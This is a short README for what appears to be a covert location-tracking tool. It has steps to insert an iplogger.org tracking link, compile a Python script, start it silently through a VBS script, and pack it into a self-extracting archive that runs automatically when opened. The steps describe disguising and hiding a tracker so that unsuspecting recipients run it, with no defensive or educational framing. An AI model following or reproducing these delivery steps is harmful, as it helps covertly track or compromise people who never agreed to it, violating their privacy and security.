# How to use
 1. In file "link" you need to write link to your "Location Tracker" (https://iplogger.org/en/)
 2. In the "start.py" file you need to change the paths to the files
 3. Compile start.py.
 4. Create VBS script for hidden start a compiled start.py 
 5. Create an SFX archive with automatic start for VBS script
 6. All is ready!
